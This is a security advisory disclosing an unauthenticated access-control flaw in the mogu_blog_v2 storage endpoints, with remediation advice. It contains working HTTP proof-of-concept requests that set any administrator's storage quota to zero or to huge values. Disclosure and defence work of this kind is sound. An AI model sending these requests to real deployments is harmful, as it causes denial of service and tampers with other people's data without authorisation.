# Unauthenticated Storage Quota Manipulation in mogu_blog_v2 via /storage Endpoints

## Vulnerability Overview

**Submitter**: sh7err@vEcho

mogu_blog_v2 is a microservice-based front-end and back-end separated blog system. A critical security vulnerability has been identified in the storage management functionality that allows unauthenticated attackers to arbitrarily manipulate storage quota allocations for any administrator account, leading to denial of service or unauthorized storage expansion.

## Affected Component

- **Project**: mogu_blog_v2
- **Vendor**: moxi159753
- **Affected Endpoints**:
  - `/storage/initStorageSize`
  - `/storage/editStorageSize`
- **Affected Files**:
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/restapi/StorageRestApi.java` (lines 40-55)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/service/impl/StorageServiceImpl.java` (lines 59-94)
  - `mogu_picture/src/main/java/com/moxi/mogublog/picture/config/WebSecurityConfig.java` (lines 50-55)

## Vulnerability Details

### Root Cause

The vulnerability exists due to the following security weaknesses:

1. **Missing Authentication**: The `/storage/**` endpoint pattern is configured with `permitAll()` in Spring Security configuration (WebSecurityConfig.java:54), allowing unauthenticated access to all storage management endpoints.

2. **No Authorization Checks**: The `StorageRestApi` controller methods do not call `RequestHolder.checkLogin()` to verify user authentication.

3. **Client-Controlled AdminUid**: Both `initStorageSize` and `editStorageSize` methods accept `adminUid` as a request parameter and directly use it to query and modify database records without verifying the caller's identity.

4. **No Identity Validation**: The service layer (`StorageServiceImpl`) performs database operations based solely on the provided `adminUid` parameter, trusting client input without validation.

### Attack Vector

An attacker can exploit this vulnerability by:

1. Sending unauthenticated POST requests to `/storage/initStorageSize` or `/storage/editStorageSize`
2. Providing any target administrator's UID in the `adminUid` parameter (can be guessed or enumerated)
3. Setting `maxStorageSize` to arbitrary values (0 for DoS, large numbers for unauthorized expansion)

The application will directly update the database record without any authentication or authorization checks.

## Proof of Concept

### DoS Attack - Set Storage Quota to Zero

```http
POST /storage/editStorageSize HTTP/1.1
Host: target-server.com
Content-Type: application/x-www-form-urlencoded

adminUid=uid00000000000000000000000000000&maxStorageSize=0
```

**Result**: The target administrator's storage quota is set to 0, preventing them from uploading any files and causing denial of service to their file upload functionality.

### Unauthorized Expansion

```http
POST /storage/editStorageSize HTTP/1.1
Host: target-server.com
Content-Type: application/x-www-form-urlencoded

adminUid=uid00000000000000000000000000000&maxStorageSize=999999999999
```

**Result**: The attacker can allocate unlimited storage space to any account, potentially exhausting server resources.

### Initialization Attack

```http
POST /storage/initStorageSize HTTP/1.1
Host: target-server.com
Content-Type: application/x-www-form-urlencoded

adminUid=newly_created_admin_uid&maxStorageSize=999999999999
```

**Result**: Attackers can initialize storage quotas for newly created administrators with arbitrary values.

## Impact

This vulnerability has **HIGH** severity and allows attackers to:

1. **Denial of Service**: Set storage quotas to zero, preventing legitimate administrators from uploading files
2. **Unauthorized Resource Allocation**: Grant unlimited storage to any account, potentially exhausting server disk space
3. **Business Logic Bypass**: Circumvent storage quota restrictions and pricing tiers
4. **Data Integrity Compromise**: Manipulate critical business data without authentication
5. **Service Disruption**: Cause operational issues by randomly modifying storage allocations

The vulnerability completely bypasses the storage quota management system and can be exploited without any credentials.

## Affected Versions

All versions of mogu_blog_v2 in the current repository are affected. The vulnerability exists in both Eureka and Nacos branches.

## Recommendations

1. **Require Authentication**: Remove `/storage/**` from the `permitAll()` list in `WebSecurityConfig.java`
2. **Add Authorization Checks**: Call `RequestHolder.checkLogin()` in all `StorageRestApi` methods
3. **Use Authenticated Identity**: Retrieve `adminUid` from the authenticated session (`request.getAttribute(SysConf.ADMIN_UID)`) instead of accepting it as a request parameter
4. **Implement Role-Based Access Control**: Only allow super administrators to modify storage quotas
5. **Add Audit Logging**: Log all storage quota modifications with user identity and timestamps
6. **Input Validation**: Validate that storage size values are within acceptable ranges

## References

- Repository: https://gitee.com/moxi159753/mogu_blog_v2
- CWE-862: Missing Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP: Broken Access Control
